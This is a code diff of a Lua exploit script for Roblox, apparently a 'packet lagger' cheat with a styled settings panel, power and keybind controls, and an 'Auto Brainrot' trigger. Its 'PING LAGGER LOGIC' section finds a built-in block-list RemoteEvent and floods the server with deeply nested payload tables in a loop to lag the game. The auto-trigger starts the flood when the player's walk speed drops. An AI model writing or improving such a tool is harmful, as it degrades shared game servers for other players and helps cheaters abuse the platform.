+settingsCrowBackground.ScaleType = Enum.ScaleType.Crop
+settingsCrowBackground.ZIndex = 20
+settingsCrowBackground.Parent = settingsFrame
+Instance.new("UICorner", settingsCrowBackground).CornerRadius = UDim.new(0, 12)
+
+Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0,12)
+applyGradient(settingsFrame, C.panel, Color3.fromRGB(10,10,10), 160)
+
+local setStroke = Instance.new("UIStroke", settingsFrame)
+setStroke.Color        = C.glow
+setStroke.Thickness    = 1.4
+setStroke.Transparency = 0.68
+
+makeDraggable(settingsFrame)
+
+-- Settings header
+local setHeader = Instance.new("Frame", settingsFrame)
+setHeader.Size             = UDim2.new(1,0,0,32)
+setHeader.BackgroundColor3 = C.glow
+setHeader.BackgroundTransparency = T.header
+setHeader.BorderSizePixel  = 0
+setHeader.ZIndex           = 21
+Instance.new("UICorner", setHeader).CornerRadius = UDim.new(0,12)
+applyGradient(setHeader, C.glow, C.purple1, 135)
+
+local setHeaderFill = Instance.new("Frame", settingsFrame)
+setHeaderFill.Size             = UDim2.new(1,0,0,8)
+setHeaderFill.Position         = UDim2.new(0,0,0,24)
+setHeaderFill.BackgroundColor3 = C.glow
+setHeaderFill.BackgroundTransparency = T.header
+setHeaderFill.BorderSizePixel  = 0
+setHeaderFill.ZIndex           = 21
+applyGradient(setHeaderFill, C.glow, C.purple1, 135)
+
+local setTitle = Instance.new("TextLabel", setHeader)
+setTitle.Size               = UDim2.new(1,-80,1,0)
+setTitle.Position           = UDim2.new(0,10,0,0)
+setTitle.BackgroundTransparency = 1
+setTitle.Text               = "Settings"
+setTitle.TextColor3         = C.white
+setTitle.Font               = Enum.Font.GothamBlack
+setTitle.TextSize           = 11
+setTitle.TextXAlignment     = Enum.TextXAlignment.Left
+setTitle.ZIndex             = 22
+
+local setCloseBtn = Instance.new("TextButton", setHeader)
+setCloseBtn.Size             = UDim2.new(0,24,0,24)
+setCloseBtn.Position         = UDim2.new(1,-28,0.5,-12)
+setCloseBtn.BackgroundColor3 = Color3.fromRGB(35,35,35)
+setCloseBtn.BackgroundTransparency = 0.15
+setCloseBtn.BorderSizePixel  = 0
+setCloseBtn.AutoButtonColor  = false
+setCloseBtn.Text             = "X"
+setCloseBtn.TextColor3       = C.white
+setCloseBtn.Font             = Enum.Font.GothamBlack
+setCloseBtn.TextSize         = 11
+setCloseBtn.ZIndex           = 23
+Instance.new("UICorner", setCloseBtn).CornerRadius = UDim.new(0,6)
+setCloseBtn.MouseEnter:Connect(function() tw(setCloseBtn,{BackgroundColor3=C.red},0.1) end)
+setCloseBtn.MouseLeave:Connect(function() tw(setCloseBtn,{BackgroundColor3=Color3.fromRGB(35,35,35)},0.1) end)
+
+-- ── Value input row builder ─────────────────────────────────
+local function mkInputRow(yPos, labelText, getValue, onConfirm)
+    local row = Instance.new("Frame", settingsFrame)
+    row.Size             = UDim2.new(1,-16,0,34)
+    row.Position         = UDim2.new(0,8,0,yPos)
+    row.BackgroundColor3 = C.card
+    row.BackgroundTransparency = T.card
+    row.BorderSizePixel  = 0
+    row.ZIndex           = 21
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
+    local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.78
+
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size               = UDim2.new(0.45,0,1,0)
+    lbl.Position           = UDim2.new(0,10,0,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text               = labelText
+    lbl.TextColor3         = C.white
+    lbl.Font               = Enum.Font.GothamBold
+    lbl.TextSize           = 10
+    lbl.TextXAlignment     = Enum.TextXAlignment.Left
+    lbl.ZIndex             = 22
+
+    local box = Instance.new("TextBox", row)
+    box.Size               = UDim2.new(0,64,0,24)
+    box.Position           = UDim2.new(1,-72,0.5,-12)
+    box.BackgroundColor3   = C.inputBg
+    box.BackgroundTransparency = T.inputBg
+    box.BorderSizePixel    = 0
+    box.Text               = tostring(getValue())
+    box.TextColor3         = C.purple3
+    box.Font               = Enum.Font.GothamBold
+    box.TextSize           = 11
+    box.ClearTextOnFocus   = false
+    box.ZIndex             = 23
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0,6)
+
+    local bs = Instance.new("UIStroke",box); bs.Color=C.glow; bs.Thickness=1; bs.Transparency=0.5
+
+    box.Focused:Connect(function()   tw(bs,{Color=C.purple2,Transparency=0},0.12) end)
+    box.FocusLost:Connect(function()
+        tw(bs,{Color=C.glow,Transparency=0.5},0.12)
+        local n = tonumber(box.Text)
+        if n then
+            onConfirm(n)
+            box.Text = tostring(getValue())
+            saveConfig()
+        else
+            box.Text = tostring(getValue())
+        end
+    end)
+
+    return box
+end
+
+-- ── Keybind row builder ──────────────────────────────────────
+local kbBindBtn, gpBindBtn
+
+local function displayGamepadKey(key)
+    return (key or ""):gsub("^Button", "")
+end
+
+local function updateKbLabels()
+    if kbBindBtn then
+        if listeningFor == "kb" then
+            kbBindBtn.Text      = "Press a key..."
+            kbBindBtn.TextColor3 = C.waiting
+        else
+            kbBindBtn.Text      = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
+            kbBindBtn.TextColor3 = C.purple3
+        end
+    end
+    if gpBindBtn then
+        if listeningFor == "gp" then
+            gpBindBtn.Text      = "Press a button..."
+            gpBindBtn.TextColor3 = C.waiting
+        else
+            gpBindBtn.Text      = cfg.keybindGp ~= "" and displayGamepadKey(cfg.keybindGp) or "None"
+            gpBindBtn.TextColor3 = C.purple3
+        end
+    end
+end
+
+local function mkKeybindRow(yPos, labelText, which)
+    local row = Instance.new("Frame", settingsFrame)
+    row.Size             = UDim2.new(1,-16,0,34)
+    row.Position         = UDim2.new(0,8,0,yPos)
+    row.BackgroundColor3 = C.card
+    row.BackgroundTransparency = T.card
+    row.BorderSizePixel  = 0
+    row.ZIndex           = 21
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
+    local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.78
+
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size               = UDim2.new(0.4,0,1,0)
+    lbl.Position           = UDim2.new(0,10,0,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text               = labelText
+    lbl.TextColor3         = C.white
+    lbl.Font               = Enum.Font.GothamBold
+    lbl.TextSize           = 10
+    lbl.TextXAlignment     = Enum.TextXAlignment.Left
+    lbl.ZIndex             = 22
+
+    local bindBtn = Instance.new("TextButton", row)
+    bindBtn.Size             = UDim2.new(0,88,0,24)
+    bindBtn.Position         = UDim2.new(1,-98,0.5,-12)
+    bindBtn.BackgroundColor3 = C.inputBg
+    bindBtn.BackgroundTransparency = T.inputBg
+    bindBtn.BorderSizePixel  = 0
+    bindBtn.AutoButtonColor  = false
+    bindBtn.Font             = Enum.Font.GothamBold
+    bindBtn.TextSize         = 9
+    bindBtn.TextColor3       = C.purple3
+    bindBtn.ZIndex           = 23
+    bindBtn.Text             = which == "kb" and cfg.keybindKb or displayGamepadKey(cfg.keybindGp)
+    Instance.new("UICorner", bindBtn).CornerRadius = UDim.new(0,6)
+
+    local bStr = Instance.new("UIStroke",bindBtn); bStr.Color=C.glow; bStr.Thickness=1; bStr.Transparency=0.5
+    bindBtn.MouseEnter:Connect(function() tw(bStr,{Color=C.purple2,Transparency=0},0.1) end)
+    bindBtn.MouseLeave:Connect(function() tw(bStr,{Color=C.glow,Transparency=0.5},0.1) end)
+
+    bindBtn.MouseButton1Click:Connect(function()
+        listeningFor = (listeningFor == which) and nil or which
+        updateKbLabels()
+    end)
+
+    if which == "kb" then kbBindBtn = bindBtn end
+    if which == "gp" then gpBindBtn = bindBtn end
+
+    return bindBtn
+end
+
+-- ── Auto Brainrot toggle row ────────────────────────────────
+local autoBrainrotBtn -- will be referenced later
+
+local function createBrainrotRow(yPos)
+    local row = Instance.new("Frame", settingsFrame)
+    row.Size             = UDim2.new(1,-16,0,34)
+    row.Position         = UDim2.new(0,8,0,yPos)
+    row.BackgroundColor3 = C.card
+    row.BackgroundTransparency = T.card
+    row.BorderSizePixel  = 0
+    row.ZIndex           = 21
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
+    local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.78
+
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size               = UDim2.new(0.7,0,1,0)
+    lbl.Position           = UDim2.new(0,10,0,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text               = "Auto Brainrot"
+    lbl.TextColor3         = C.white
+    lbl.Font               = Enum.Font.GothamBold
+    lbl.TextSize           = 10
+    lbl.TextXAlignment     = Enum.TextXAlignment.Left
+    lbl.ZIndex             = 22
+
+    local toggleBtn = Instance.new("TextButton", row)
+    toggleBtn.Size             = UDim2.new(0,94,0,24)
+    toggleBtn.Position         = UDim2.new(1,-102,0.5,-12)
+    toggleBtn.BackgroundColor3 = cfg.autoBrainrot and Color3.fromRGB(255,255,255) or Color3.fromRGB(0,0,0)
+    toggleBtn.BorderSizePixel  = 0
+    toggleBtn.AutoButtonColor  = false
+    toggleBtn.Text             = cfg.autoBrainrot and "ACTIVATE" or "DÉSACTIVATE"
+    toggleBtn.TextColor3       = cfg.autoBrainrot and Color3.fromRGB(0,0,0) or Color3.fromRGB(255,255,255)
+    toggleBtn.Font             = Enum.Font.GothamBlack
+    toggleBtn.TextSize         = 9
+    toggleBtn.ZIndex           = 23
+    Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1,0)
+
+    local tStr = Instance.new("UIStroke", toggleBtn)
+    tStr.Color = C.glow; tStr.Thickness = 1; tStr.Transparency = 0.72
+
+    toggleBtn.MouseButton1Click:Connect(function()
+        cfg.autoBrainrot = not cfg.autoBrainrot
+        toggleBtn.Text = cfg.autoBrainrot and "ACTIVATE" or "DÉSACTIVATE"
+        toggleBtn.TextColor3 = cfg.autoBrainrot and Color3.fromRGB(0,0,0) or Color3.fromRGB(255,255,255)
+        tw(toggleBtn, {BackgroundColor3 = cfg.autoBrainrot and Color3.fromRGB(255,255,255) or Color3.fromRGB(0,0,0)}, 0.15)
+        saveConfig()
+    end)
+
+    autoBrainrotBtn = toggleBtn
+    return toggleBtn
+end
+
+-- Build rows (adjusted Y positions)
+local Y = 36  -- start lower
+local GAP = 6
+
+local powerBox = mkInputRow(Y, "Power", function() return cfg.power end, function(v)
+    cfg.power = math.max(1, v)
+end)
+Y = Y + 34 + GAP
+
+-- Insert Auto Brainrot row here (above keybinds)
+createBrainrotRow(Y)
+Y = Y + 34 + GAP
+
+-- Divider + section label
+local div = Instance.new("Frame", settingsFrame)
+div.Size             = UDim2.new(1,-16,0,1)
+div.Position         = UDim2.new(0,8,0,Y)
+div.BackgroundColor3 = C.glow
+div.BorderSizePixel  = 0
+div.BackgroundTransparency = 0.5
+div.ZIndex           = 21
+Y = Y + 8
+
+local kbSectLbl = Instance.new("TextLabel", settingsFrame)
+kbSectLbl.Size               = UDim2.new(1,-16,0,16)
+kbSectLbl.Position           = UDim2.new(0,8,0,Y)
+kbSectLbl.BackgroundTransparency = 1
+kbSectLbl.Text               = "KEYBIND / CONTROLOR"
+kbSectLbl.TextColor3         = C.dim
+kbSectLbl.Font               = Enum.Font.GothamBold
+kbSectLbl.TextSize           = 8
+kbSectLbl.TextXAlignment     = Enum.TextXAlignment.Left
+kbSectLbl.ZIndex             = 21
+Y = Y + 16
+
+mkKeybindRow(Y, "Keyboard",   "kb"); Y = Y + 34 + GAP
+mkKeybindRow(Y, "Controller", "gp"); Y = Y + 34 + GAP
+
+-- ══════════════════════════════════════════════════════════════════════
+-- SETTINGS OPEN / CLOSE
+-- ══════════════════════════════════════════════════════════════════════
+local settingsOpen = false
+
+local function openSettings()
+    settingsOpen          = true
+    settingsFrame.Visible = true
+    settingsFrame.Size    = UDim2.new(0,SET_W,0,0)
+    tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,SET_H)}, 0.2)
+    tw(settingsEmojiBtn, {BackgroundColor3=C.purple1}, 0.12)
+    powerBox.Text    = tostring(cfg.power)
+    updateKbLabels()
+    -- update brainrot toggle label/color
+    if autoBrainrotBtn then
+        autoBrainrotBtn.Text = cfg.autoBrainrot and "ACTIVATE" or "DÉSACTIVATE"
+        autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and Color3.fromRGB(255,255,255) or Color3.fromRGB(0,0,0)
+        autoBrainrotBtn.TextColor3 = cfg.autoBrainrot and Color3.fromRGB(0,0,0) or Color3.fromRGB(255,255,255)
+    end
+end
+
+local function closeSettings()
+    settingsOpen = false
+    listeningFor = nil
+    updateKbLabels()
+    tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,0)}, 0.16)
+    task.delay(0.18, function() settingsFrame.Visible = false end)
+    tw(settingsEmojiBtn, {BackgroundColor3=Color3.fromRGB(35,35,35)}, 0.12)
+    hideConfirm()
+end
+
+settingsEmojiBtn.MouseButton1Click:Connect(function()
+    if settingsOpen then closeSettings() else openSettings() end
+end)
+setCloseBtn.MouseButton1Click:Connect(closeSettings)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- PING LAGGER LOGIC
+-- ══════════════════════════════════════════════════════════════════════
+
+local function findRemote()
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    local remote
+    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
+        local r = rrs:FindFirstChild(name)
+        if r and r:IsA("RemoteEvent") then remote = r break end
+    end
     if not remote then
-        remote = resolveRemote()
+        for _, c in ipairs(rrs:GetChildren()) do
+            if c:IsA("RemoteEvent") and c.Name:find("Block") then remote = c break end
+        end
     end
-end)
+    return remote
+end
 
--- Activation keybind only: keyboard and controller supported
-local activationKey = nil
-local listening = false
-local resetToken = 0
+remote = findRemote()
 
-local function updateBindText()
-    if listening then
-        activationBind.Text = "LISTENING..."
-    elseif activationKey then
-        activationBind.Text = "ACTIVATE: " .. activationKey.Name
-    else
-        activationBind.Text = "ACTIVATE: CHOOSE A KEYBIND"
+local function buildPayload(power)
+    local main = {}
+    local nested = {{}}
+    local current = nested[1]
+    for _ = 1, 186 do
+        local n = {}
+        table.insert(current, n)
+        current = n
+    end
+    local maxRep = math.min(math.floor(power / 188), 10000)
+    for _ = 1, maxRep do
+        table.insert(main, nested)
+    end
+    return main
+end
+
+local function runPingLoop()
+    local delay = cfg.interval
+    while active and remote do
+        local payload = buildPayload(cfg.power)
+        local ok = pcall(function() remote:FireServer(payload) end)
+        if not ok then
+            delay = math.min(delay * 1.5, 0.5)
+        else
+            delay = math.max(delay * 0.995, 0.05)
+        end
+        task.wait(delay)
     end
 end
 
-activationBind.Activated:Connect(function()
-    if listening then
-        listening = false
-        updateBindText()
-    elseif activationKey then
-        activationKey = nil
-        listening = false
-        resetToken += 1
-        local token = resetToken
-        activationBind.Text = "RESET"
-        task.delay(2, function()
-            if resetToken == token and not activationKey and not listening then
-                updateBindText()
-            end
-        end)
-    else
-        listening = true
-        updateBindText()
+local function flipLag(state, isManual)
+    active = state
+
+    if isManual then
+        if brainrotMode then
+            manualOverride = not state
+        else
+            manualOverride = false
+        end
     end
+
+    if active then
+        if not remote then
+            remote = findRemote()
+            if not remote then
+                active = false
+                flipLag(false)
+                return
+            end
+        end
+        activateBtn.Text = "DÉSACTIVATE"
+        activateBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
+        activateBtn.BackgroundTransparency = 0.08
+        activateBtn.TextColor3 = Color3.fromRGB(0,0,0)
+        mainStroke.Color            = C.white
+        mainStroke.Transparency     = 0.1
+        task.spawn(runPingLoop)
+    else
+        activateBtn.Text = "ACTIVATE"
+        activateBtn.BackgroundColor3 = Color3.fromRGB(0,0,0)
+        activateBtn.BackgroundTransparency = 0.08
+        activateBtn.TextColor3 = Color3.fromRGB(255,255,255)
+        mainStroke.Color            = C.white
+        mainStroke.Transparency     = 0.35
+    end
+end
+
+activateBtn.MouseButton1Click:Connect(function()
+    flipLag(not active, true)
 end)
 
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    local keyCode = input.KeyCode
-    if keyCode == Enum.KeyCode.Unknown then return end
-
-    local inputType = input.UserInputType
-    local isKeyboard = inputType == Enum.UserInputType.Keyboard
-    local isGamepad = string.find(inputType.Name, "Gamepad") ~= nil
-    if not isKeyboard and not isGamepad then return end
-
-    if listening then
-        activationKey = keyCode
-        listening = false
-        resetToken += 1
-        updateBindText()
+-- ══════════════════════════════════════════════════════════════════════
+-- AUTO BRAINROT DETECTION
+-- ══════════════════════════════════════════════════════════════════════
+RunService.Heartbeat:Connect(function()
+    if not cfg.autoBrainrot then
+        -- If auto is off, but brainrotMode is still true from before, we need to reset
+        if brainrotMode then
+            brainrotMode = false
+            lastBrainrotState = false
+            manualOverride = false
+            flipLag(false)
+        end
         return
     end
 
-    -- gamepad buttons are frequently "processed" by the game's UI navigation,
-    -- so a bound controller button is honoured either way (same as v1)
-    if (isGamepad or not gameProcessed) and activationKey and keyCode == activationKey then
-        setActivated(not activated)
+    local char = plr.Character
+    if not char then return end
+    local hum = char:FindFirstChild("Humanoid")
+    if not hum then return end
+
+    local hasBrainrot = hum.WalkSpeed < 25
+
+    if hasBrainrot and not lastBrainrotState then
+        -- Brainrot acquired
+        brainrotMode = true
+        lastBrainrotState = true
+        manualOverride = false -- fresh pickup clears any prior override
+        flipLag(true)  -- activate lagger
+    elseif not hasBrainrot and lastBrainrotState then
+        -- Brainrot lost
+        brainrotMode = false
+        lastBrainrotState = false
+        manualOverride = false
+        flipLag(false) -- deactivate lagger
     end
 end)
 
--- Drag from title area; buttons stay clickable
-local dragHandle = Instance.new("TextButton")
-dragHandle.Name = "DragHandle"
-dragHandle.Size = UDim2.fromOffset(155, 55)
-dragHandle.BackgroundTransparency = 1
-dragHandle.Text = ""
-dragHandle.Active = true
-dragHandle.Selectable = false
-dragHandle.ZIndex = 5
-dragHandle.Parent = main
+-- ══════════════════════════════════════════════════════════════════════
+-- INPUT HANDLER
+-- ══════════════════════════════════════════════════════════════════════
+UserInputService.InputBegan:Connect(function(input, processed)
+    local kc  = input.KeyCode
+    if kc == Enum.KeyCode.Unknown then return end
 
-local dragging = false
-local dragStart
-local startPosition
-local activeTouch
+    local isGp = isGamepad(kc)
+    local isKb = input.UserInputType == Enum.UserInputType.Keyboard
 
-local function updatePanelPosition()
-    panel.Position = UDim2.new(
-        main.Position.X.Scale, main.Position.X.Offset,
-        main.Position.Y.Scale, main.Position.Y.Offset + 116
-    )
-end
-
-dragHandle.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1
-        or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPosition = main.Position
-        activeTouch = input
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if not dragging then return end
-    if input.UserInputType == Enum.UserInputType.MouseMovement
-        or (input.UserInputType == Enum.UserInputType.Touch and input == activeTouch) then
-        local delta = input.Position - dragStart
-        main.Position = UDim2.new(
-            startPosition.X.Scale, startPosition.X.Offset + delta.X,
-            startPosition.Y.Scale, startPosition.Y.Offset + delta.Y
-        )
-        updatePanelPosition()
-    end
-end)
-
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1
-        or (input.UserInputType == Enum.UserInputType.Touch and input == activeTouch) then
-        dragging = false
-        activeTouch = nil
-    end
-end)
-
--- plain "-" for closed state, no special characters
-settingsToggle.Activated:Connect(function()
-    panel.Visible = not panel.Visible
-    settingsToggle.Text = panel.Visible and "-" or "+"
-end)
-
--- =====================================================================
--- SAVE / LOAD SETTINGS
--- Saves power, activation keybind, auto glow and window position, then
--- restores them automatically the next time this script is executed.
--- =====================================================================
-local CONFIG_FILE = "RomePacketLagger_Settings.json"
-local LEGACY_CONFIG_FILES = {
-    "RyznPacketLagger_Config.json",
-    "IceHubLaggerOmahad_Config.json",
-}
-
-local function hasFileAPI()
-    return writefile ~= nil and readfile ~= nil and isfile ~= nil
-end
-
-local function saveSettings()
-    if not hasFileAPI() then return false end
-
-    local cfg = {
-        Power = powerValue,
-        Key   = activationKey and activationKey.Name or "",
-        Glow  = autoGlow,
-        PX_S  = main.Position.X.Scale, PX_O = main.Position.X.Offset,
-        PY_S  = main.Position.Y.Scale, PY_O = main.Position.Y.Offset,
-    }
-
-    local ok = pcall(function()
-        writefile(CONFIG_FILE, HttpService:JSONEncode(cfg))
-    end)
-    return ok
-end
-
-local function loadSettings()
-    if not hasFileAPI() then return false end
-
-    local file
-    if isfile(CONFIG_FILE) then
-        file = CONFIG_FILE
-    else
-        for _, legacy in ipairs(LEGACY_CONFIG_FILES) do
-            if isfile(legacy) then
-                file = legacy
-                break
-            end
+    if listeningFor then
+        if kc == Enum.KeyCode.Escape then
+            listeningFor = nil
+            updateKbLabels()
+            return
         end
-    end
-    if not file then return false end
-
-    local ok, cfg = pcall(function()
-        return HttpService:JSONDecode(readfile(file))
-    end)
-    if not ok or type(cfg) ~= "table" then return false end
-
-    -- power (v1 configs called it Intensity)
-    local savedPower = tonumber(cfg.Power) or tonumber(cfg.Intensity)
-    if savedPower then
-        setPower(savedPower)
-    end
-
-    -- keybind (v1 configs used KBM / Keybind)
-    local keyName = cfg.Key
-    if type(keyName) ~= "string" or keyName == "" then
-        keyName = cfg.KBM or cfg.Keybind
-    end
-    if type(keyName) == "string" and keyName ~= "" then
-        local okKey, key = pcall(function()
-            return Enum.KeyCode[keyName]
-        end)
-        if okKey and key then
-            activationKey = key
-            listening = false
-            resetToken += 1
-            updateBindText()
+        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
+            cfg.keybindKb = kc.Name
+            listeningFor  = nil
+            updateKbLabels()
+            saveConfig()
+            return
         end
-    end
-
-    -- auto glow
-    if cfg.Glow ~= nil then
-        setAutoGlow(cfg.Glow == true)
-    end
-
-    -- window position
-    if tonumber(cfg.PX_S) and tonumber(cfg.PX_O) and tonumber(cfg.PY_S) and tonumber(cfg.PY_O) then
-        main.Position = UDim2.new(cfg.PX_S, cfg.PX_O, cfg.PY_S, cfg.PY_O)
-        updatePanelPosition()
-    end
-
-    return true
-end
-
--- SAVE SETTINGS button feedback
-local saveToken = 0
-local SAVE_IDLE_COLOR = Color3.fromRGB(124, 22, 30)
-
-local function flashSave(text, color, revertAfter)
-    saveToken += 1
-    local token = saveToken
-
-    saveButton.Text = text
-    saveButton.BackgroundColor3 = color
-
-    task.delay(revertAfter, function()
-        if saveToken == token then
-            saveButton.Text = "SAVE SETTINGS"
-            saveButton.BackgroundColor3 = SAVE_IDLE_COLOR
+        if listeningFor == "gp" and isGp then
+            cfg.keybindGp = kc.Name
+            listeningFor  = nil
+            updateKbLabels()
+            saveConfig()
+            return
         end
-    end)
-end
+        return
+    end
 
-saveButton.Activated:Connect(function()
-    if saveSettings() then
-        flashSave("SAVED", Color3.fromRGB(28, 135, 76), 1.4)
-    elseif not hasFileAPI() then
-        flashSave("NO FILE API", Color3.fromRGB(120, 60, 20), 2)
-    else
-        flashSave("SAVE FAILED", Color3.fromRGB(120, 20, 26), 2)
+    if processed then return end
+
+    if kc == Enum.KeyCode.LeftControl then
+        mainFrame.Visible = not mainFrame.Visible
+        if not mainFrame.Visible then closeSettings() end
+        return
+    end
+
+    -- Manual keybind always works, even during brainrot mode
+    local kbEnum = resolveKb(cfg.keybindKb)
+    local gpEnum = resolveKb(cfg.keybindGp)
+
+    if (kbEnum and kc == kbEnum and isKb)
+    or (gpEnum and kc == gpEnum and isGp) then
+        flipLag(not active, true)
     end
 end)
 
--- restore previous settings before the first frame is shown
-local restored = loadSettings()
-
-updatePanelPosition()
-refreshPower()
-updateBindText()
-
-if restored then
-    print("[ROME] settings loaded from " .. CONFIG_FILE)
-end
+updateKbLabels()
